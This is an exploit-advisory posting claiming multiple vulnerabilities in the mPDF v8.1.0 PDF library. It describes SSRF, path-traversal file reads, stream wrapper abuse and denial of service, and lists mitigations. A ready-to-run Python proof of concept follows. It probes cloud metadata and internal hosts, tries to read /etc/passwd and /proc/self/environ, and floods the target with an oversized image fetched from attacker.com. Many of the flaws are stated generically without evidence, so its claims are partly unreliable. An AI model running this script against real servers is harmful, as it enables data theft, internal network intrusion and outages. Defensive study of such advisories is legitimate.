@@ -1,0 +1,233 @@
+=============================================================================================================================================
+| # Title     : mPDF v8.1.0 Multiple Vulnerabilities                                                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/mpdf/mpdf                                                                                                |
+=============================================================================================================================================
+
+[+] References: 
+
+[+] Summary:  mPDF v8.1.0 is vulnerable to multiple security issues related to unsafe handling of external resources, file paths, and image content during HTML-to-PDF rendering.
+              When untrusted or partially trusted HTML input is processed, attackers may exploit insufficient validation to trigger SSRF, local file disclosure, or denial of service conditions.
+              The library allows fetching of external resources (images, SVG, CSS) without strict protocol, IP range, or size restrictions. 
+			  Additionally, file access functions may be abused to read arbitrary local files when input validation is not enforced by the application.
+
+[+] Technical Details :
+
+1. Server-Side Request Forgery (SSRF)
+
+mPDF fetches external resources referenced in HTML (e.g. <img src="">) without enforcing restrictions on:
+
+localhost / 127.0.0.1
+
+Internal IP ranges (10.0.0.0/8, 192.168.0.0/16, 169.254.0.0/16)
+
+Cloud metadata endpoints
+
+This allows attackers to force the server to issue internal network requests.
+
+[+] Impact :Internal service enumeration, metadata leakage, sensitive data exposure.
+
+2. Local File Inclusion / Arbitrary File Read
+
+Improper validation of file paths may allow attackers to reference local files using traversal sequences or absolute paths.
+
+Example payload:
+
+../../../../etc/passwd
+
+[+] Impact : Disclosure of sensitive system or application files.
+
+3. Stream Wrapper Abuse
+
+Partial wrapper validation exists, but alternative PHP stream wrappers may still be accessible depending on configuration, such as:
+
+zip://
+
+glob://
+
+compress.zlib://
+
+expect:// (where enabled)
+
+[+] Impact: Bypass of security controls, unexpected file access behavior.
+
+4. Denial of Service (Memory Exhaustion)
+
+mPDF processes images using in-memory operations without enforcing:
+
+Maximum file size
+
+Maximum image dimensions
+
+Attackers may supply:
+
+Extremely large images
+
+Image-based zip bombs (PNG)
+
+[+] Impact : Memory exhaustion, application crash, request timeout.
+
+5. Image Parsing Risks (GD / ImageMagick)
+
+The library relies heavily on PHP image processing functions historically affected by:
+
+Heap overflows
+
+Integer overflows
+
+Risk increases when running on outdated PHP or GD versions.
+
+6. SVG External Resource Injection
+
+SVG images may contain:
+
+<image xlink:href>
+
+<use>
+
+External references
+
+These can trigger SSRF or lead to XSS if the generated PDF is later rendered in a browser context.
+
+7. Temporary File Race Condition
+
+Temporary files created and deleted during PDF generation may be vulnerable to TOCTOU or symlink attacks in shared hosting environments.
+
+8. Weak MIME Type Validation
+
+File type detection relies on partial content inspection rather than strict header-based validation, allowing polyglot files in certain contexts.
+
+[+] Impact :
+
+Successful exploitation may allow an attacker to:
+
+Access internal services (SSRF)
+
+Read arbitrary local files (LFI)
+
+Crash the application (DoS)
+
+Chain vulnerabilities for deeper compromise
+
+Remediation / Mitigation
+
+Restrict allowed URL schemes (allowlist https:// only)
+
+Block internal IP ranges and metadata endpoints
+
+Disable unnecessary PHP stream wrappers
+
+Enforce strict file size and image dimension limits
+
+Sanitize and validate all user-supplied HTML
+
+Disable or strictly sanitize SVG support
+
+Use updated PHP and GD/ImageMagick versions
+
+Avoid suppressing runtime errors
+
+[+] POC : python poc.py
+
+#!/usr/bin/env python3
+import requests
+import sys
+
+def exploit_ssrf(target_url, internal_service):
+
+    payload = f"{target_url}?image={internal_service}"
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Security-Test)'
+    }
+    
+    try:
+        response = requests.get(payload, headers=headers, timeout=30)
+        
+        if response.status_code == 200:
+            print(f"[+] SSRF Success on: {internal_service}")
+            print(f"[+] Response ({len(response.content)} bytes):")
+            print(response.text[:500])  # Display first 500 characters
+        else:
+            print(f"[-] SSRF Failed: Status Code {response.status_code}")
+            
+    except Exception as e:
+        print(f"[-] Error during SSRF: {e}")
+
+def exploit_lfi(target_url, file_path):
+
+    payload = f"{target_url}?image=../../../../{file_path}"
+    
+    try:
+        response = requests.get(payload, timeout=30)
+
+        if "root:" in response.text or "DOCTYPE" not in response.text:
+            print(f"[+] LFI Success! File read: {file_path}")
+            print(response.text[:1000])
+        else:
+            print(f"[-] LFI Failed: File not found or input filtered.")
+            
+    except Exception as e:
+        print(f"[-] Error during LFI: {e}")
+
+def dos_attack(target_url):
+
+    image_url = "http://attacker.com/large_image.jpg" 
+    
+    payload = f"{target_url}?image={image_url}"
+    
+    print(f"[+] Starting DoS test on: {target_url}")
+    
+    for i in range(10):
+        try:
+            requests.get(payload, timeout=5)
+            print(f"  [-] Request {i+1} sent")
+        except requests.exceptions.Timeout:
+            print(f"  [!] Server is likely unresponsive (Timeout)")
+        except Exception as e:
+            print(f"  [!] Connection error: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage:")
+        print("  python3 exploit.py <target_url>")
+        print("\nExample:")
+        print("  python3 exploit.py http://victim.com/pdf-generator")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    print("[*] Beginning Penetration Testing Script...")
+
+    print("\n[1] Testing for SSRF:")
+    internal_targets = [
+        "http://169.254.169.254/latest/meta-data/", # AWS/Cloud Metadata
+        "http://127.0.0.1:8080/",                   # Local Web Service
+        "http://localhost:9200/",                   # Elasticsearch
+        "http://192.168.1.1/"                       # Router/Internal Gateway
+    ]
+    
+    for service in internal_targets:
+        exploit_ssrf(target, service)
+
+    print("\n[2] Testing for LFI:")
+    sensitive_files = [
+        "etc/passwd",
+        "proc/self/environ",
+        "etc/hosts",
+        "windows/win.ini"
+    ]
+    
+    for file in sensitive_files:
+        exploit_lfi(target, file)
+
+    print("\n[3] DoS Testing (Optional - May cause downtime):")
+    answer = input("Do you want to proceed with the DoS test? (y/n): ")
+    if answer.lower() == 'y':
+        dos_attack(target)
+		
+		
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
